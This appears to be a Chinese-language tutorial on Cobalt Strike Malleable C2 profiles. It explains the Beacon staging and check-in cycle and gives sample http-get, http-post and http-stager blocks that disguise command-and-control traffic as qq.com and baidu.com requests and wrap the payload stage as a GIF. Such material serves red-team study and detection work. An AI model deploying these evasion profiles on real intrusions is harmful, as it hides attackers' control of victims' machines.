---


layout: default
---



# Cobalt Strike -- Malleable C2 Profile

## 0x01 Malleable C2 Profile 基础

CobaltStrike提供Melleable C2 Profile文件可以修改Beacon默认的流量以及行为特征，从而达到隐藏自身的效果。按照官方文档的说法，创建配置文件最好的办法就是修改现有的配置文件，[Github](https://github.com/rsmudge/Malleable-C2-Profifiles)上有一个配示例仓库。可以从该仓库中参考定制Profile文件。然后适用cs自带的profile检查工具`c2init`检查Profile是否能正常运行。

### CS基本名词

* `Staging `: 指的是payload分阶段下发的过程

* `Stager` : 是一段短的汇编指令，用来下载stage，并将其注入内存执行

* `Stage` : 是实际最终执行的payload

* `Beacon` : 指在受害机上运行的CS客户端(Payload)

  

### Beacon交互过程

1. 如果Teamserver使用了staging，则stager像teamserver发送一条Get请求获取Payload stage
2. Beacon运行后会向Teamserver发送包含元数据的Get心跳包请求
3. Teamserver收到Beacon的元数据请求后，会发送一个返回包给Beacon，如果Teamserver有命令下发给Beacon，命令会包含在这个返回包里
4. Beacon收到Teamserver带有命令的返回包，执行完任务后，会将回显数据通过POST请求包发送给Teamserver
5. Teamserver收到POST包之后同样会发送一个返回包，这个返回包不包含任何命令等信息，Beacon不对这个返回包进行任何相应，从而循环执行2步骤



## 0x02 Profile详解

### 基本语法

* `#` 为注释信息

* `set`关键字用来赋值

* `{}`花括号用来组合http-get / http-post包含的信息及语句

* 每条语句都以`;`结尾

  

### http-get

`http-get`部分用来自定义Beacon与teamserver交互的2、3过程中的请求。`client`模块对应的是Beacon上传元数据心跳包的请求。`server`模块对应的是Teamserver接收心跳后下发命令的请求包。

```
http-get {
    # 心跳包的请求url
    set uri "/qq.js";

    # 心跳包的请求包的格式，其中metadata是包含beacon客户端的元数据
    client {
        header "Accept" "*/*";
        header "Accept-Encoding" "gzip, deflate";
        header "Host" "www.qq.com";
        header "Cookie" "99187231";
        metadata {
            base64url;
            prepend "https://www.baidu.com";
            header "Referer";
        }
    }

    # 心跳包的返回包格式，其中ouput是包含teamserver下发的命令内容
    server{

        header "Server" "nginx";
        header "Content-Encoding" "text/javascript";

        output{
            base64;
            prepend "{";
            append "};";
            print;
        }
    }
}
```



### http-post

`http-post`部分用来自定义Beacon与Teamserver交互的4、5过程中的请求。`client`模块对应的是Beacon上传命令执行结果的POST请求。`server`模块对应的是Teamserver的返回。

```
http-post{
    # 命令回显结果的请求包的url
    set uri "/search";
    
    # 命令回显的请求包格式，其中包含命令执行返回值，其中需要包括id用来标识会话，output是命令执行结果在请求包中的位置
    client{
        header "Host" "www.baidu.com";

        id {
            base64url;
            prepend "https://t.qq.com/";
            header "Referer";
        }

        output{
            base64url;
            prepend "aid=522005705&accver=1&showtype=embed&ua=";
            print;
        }
    }

    # teamserver收到命令执行结果请求包后的返回包，默认为空
    server{
        header "Server" "nginx";
        header "Content-Type" "application/json";
        header "Connection" "close";
        header "Accept-Ranges" "bytes";
        header "P3P" "CP=CAO PSA OUR";
        
        output{
            base64;
            print; 
        }
    }
    
}
```



### http-stager

 `http-stager`用来自定义HTTP staging 过程，也就是对应的是Beacon与Teamserver交互的第一步。 `set uri_x`设置的是不同位数的payload对应的uri。`client`对应是stager请求stage的请求包。 `server`对应的是stage内容的返回包。

```
http-stager{
    # 第一次获取stage请求的url
  set uri_x86 "/load.gif";
	set uri_x64 "/loading.gif";

    # 获取stage的请求包内容
    client {
        header "Host" "www.qq.com";
	}

    # stage返回包的格式，其中包含stage的payload
    server {
		header "Content-Type" "image/gif";
		output {
			prepend "GIF89a";
			print;
		}
	}
}
```



### http-config 

`http-config`是用来定制CS Web服务的HTTP请求的请求头，如果在上面get和post中一定指定过的header头会被忽略。`set header`用来指定header头的顺序，不在`set header`中的header字段会被排在下面。`set trust_x_forwarded_for`用来指定是否通过`x-forworded-for`来确定远程访问的IP，如果使用了重定向器就需要指定为True

### Profile Variants

在同一个配置文件中配置多个配置模板

### https-certificate

http-certificate主要用来设置SSL证书相关

### stage 

 stage 块控制如何将 Beacon 加载到内存中以及编辑 Beacon DLL 的内容。



## 0x03 参考链接

* [cs官方文档](https://www.cobaltstrike.com/help-malleable-c2)
* [How to Write Malleable C2 Profiles for Cobalt Strike](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
* [深入研究cobalt strike malleable C2配置文件](https://xz.aliyun.com/t/2796)

  

